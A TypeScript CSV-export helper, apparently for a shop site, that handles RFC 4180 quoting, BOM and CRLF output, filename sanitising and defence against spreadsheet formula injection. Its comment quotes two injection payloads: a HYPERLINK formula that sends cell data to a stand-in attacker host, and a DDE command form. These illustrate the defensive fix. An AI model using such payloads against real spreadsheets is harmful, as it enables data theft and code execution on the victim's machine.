/**
 * CSV, hand-rolled. No dependency, and two rules that a naive
 * `values.join(",")` gets wrong.
 *
 * **Quoting (RFC 4180).** A field containing a comma, a quote, a newline or
 * a carriage return is wrapped in double quotes, and any quote inside it is
 * doubled. Leading and trailing spaces are quoted too, because several
 * readers strip them otherwise and "  Kandhamal" is not the same string as
 * "Kandhamal".
 *
 * **Formula injection.** This is the one that matters. A cell beginning
 * `=`, `+`, `-`, `@`, a tab or a carriage return is evaluated as a formula
 * by Excel, LibreOffice and Google Sheets when the file is opened. A
 * customer who types `=HYPERLINK("https://evil.example/"&A1,"Click")` into
 * a name field, or the older `=cmd|'/c calc'!A1` DDE form, has written code
 * that runs on the owner's machine the moment they open the export. It is a
 * real, exploited class of bug (CWE-1236), and the export is exactly the
 * path that carries untrusted text — customer names, addresses, return
 * reasons, review bodies — out of the site and into a spreadsheet.
 *
 * The fix is to prefix such a cell with an apostrophe, which every
 * spreadsheet reads as "this is text". It is visible in the cell, which is
 * the honest trade: a leading quote the owner can see beats silent code
 * execution they cannot.
 *
 * A negative number is a false positive of that rule — `-500` starts with a
 * minus. Numbers are therefore checked first and passed through, so a
 * refund column still sums.
 */

const NEEDS_QUOTING = /[",\r\n]|^\s|\s$/;
const RISKY_PREFIX = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

/** One field, escaped and made safe to open. */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";

  const raw =
    value instanceof Date
      ? value.toISOString()
      : typeof value === "boolean"
        ? value
          ? "yes"
          : "no"
        : String(value);

  // A number is never a formula, and mangling it would break every sum in
  // the sheet. Checked before the prefix rule so that -500 stays -500.
  const text =
    PLAIN_NUMBER.test(raw) || !RISKY_PREFIX.test(raw) ? raw : `'${raw}`;

  if (!NEEDS_QUOTING.test(text)) return text;
  return `"${text.replaceAll('"', '""')}"`;
}

export function csvRow(values: readonly unknown[]): string {
  return values.map(csvCell).join(",");
}

/**
 * A whole document: header row, then the data.
 *
 * CRLF line endings, because RFC 4180 says so and because Excel on Windows
 * — which is what this file is opened in — treats a bare LF file as one
 * long row in some locales.
 *
 * The BOM is not decorative either. Without it Excel reads the file in the
 * system codepage, and every rupee sign, every Odia or Devanagari character
 * in a customer's name, arrives as mojibake. Three bytes buys correct
 * Unicode in the one program this will actually be opened in.
 */
export function toCsv(
  headers: readonly string[],
  rows: readonly (readonly unknown[])[],
): string {
  const lines = [csvRow(headers), ...rows.map(csvRow)];
  return `﻿${lines.join("\r\n")}\r\n`;
}

/**
 * Content-Disposition for a download, with the filename sanitised.
 *
 * Anything outside a small safe set is dropped rather than escaped: a
 * filename is not a place to be clever, and a stray quote or newline here
 * is header injection.
 */
export function csvHeaders(filename: string): HeadersInit {
  const safe =
    filename.replace(/[^A-Za-z0-9._-]/g, "-").slice(0, 80) || "export";
  return {
    "Content-Type": "text/csv; charset=utf-8",
    "Content-Disposition": `attachment; filename="${safe}.csv"`,
    // An export is a snapshot of live data and must never be cached by a
    // proxy — it contains customer names and addresses.
    "Cache-Control": "no-store, private",
  };
}
